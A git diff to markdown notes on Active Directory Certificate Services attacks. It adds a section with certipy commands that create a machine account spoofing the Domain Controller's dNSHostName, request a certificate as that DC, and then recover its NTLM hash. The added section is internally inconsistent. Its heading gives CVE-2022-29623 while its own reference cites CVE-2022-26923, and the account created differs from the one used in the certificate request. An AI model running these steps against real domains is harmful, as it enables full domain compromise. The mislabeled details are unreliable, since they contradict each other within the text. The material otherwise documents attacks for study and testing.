@@ -16,7 +16,8 @@ You won't find anything new here, I simply wanted to understand how this technol
 8. [ESC6: CA has EDIT_ATTRIBUTESUBJECTALTNAME2 flag set](#ECS6)
 9. [ESC7: Vulnerable Certificate Authority Access Control](#ECS7)
 11. [ESC8: NTLM Relay to AD CS HTTP Endpoints](#ECS8)
-12. [References](#references)
+12. [CVE-2022-29623](#CVE-2022-29623)
+13. [References](#references)
 
 
 <a name="ADCS"></a>
@@ -311,6 +312,24 @@ certipy req 'EvilCorp.local/MCUser:EvilCorp3.@EVILDC1.EvilCorp.local' -ca 'EvilC
 
 TODO -->
 
+<a name="CVE-2022-29623"></a>
+<br></br>
+<h3 align="center" id="heading">CVE-2022-29623:</h3>
+
+An attacker/user that has the ability to create a machine account and tamper with the dNSHostName attribute to mimic any machine on the domain can abuse Active Directory Certificate Services to request for a certificate as that machine that has been mimicked. In essence if an attacker creates a machine account and manipulates the dNSHostName to that of the Domain Controller, when a certificate is requested as that newly created machine account it will receive a certificate with the authorization as the Domain Controller. This can then be used to get sensitive information from the Domain Controller and eventually full Domain Admin access.
+
+How to abuse:
+
+The first step is create a new machine account with the dNSHostName principle as that of the Domain Controller. We can do this directly using certipy:
+
+```
+certipy account create 'EVILCORP/Administrator:EvilCorp1.@EVILDC1.EvilCorp.local' -user 'evilMachine1' -dns 'EVILDC1.EvilCorp.local'
+```
+Now, request a certificate for the fake machine account and since its dNSHostName value is set to that of the Domain Controller we will get a certificate that has the authentication corresponding to that of the Domain Controller:
+```
+certipy req 'EvilCorp.local/evil1$:2XrkXdyexxLLyULM@EvilCorp.local' -ca 'EvilCorp-EVILDC1-CA' -template 'Vulnerable ESC1'
+```
+After this, you can use the auth flag to perform again the UnPac the hash to retrieve the NTLM hash for the Domain Controller machine account.
 
 <a name="references"></a>
 <br></br>
@@ -324,6 +343,7 @@ https://speakerdeck.com/heirhabarov/hunting-for-active-directory-certificate-ser
 * [AD CS ESC7-Attack](https://www.tarlogic.com/blog/ad-cs-esc7-attack/)
 * [AD CS Manage CA-RCE](https://www.tarlogic.com/blog/ad-cs-manageca-rce/)
 * [NTLM Relaying to AD CS](https://dirkjanm.io/ntlm-relaying-to-ad-certificate-services/)
+* [ABUSING CVE-2022-26923](https://macrosec.tech/index.php/2022/06/01/abusing-cve-2022-26923-through-socks5-on-a-mythic-c2-agent/)
 
 Tools:
 
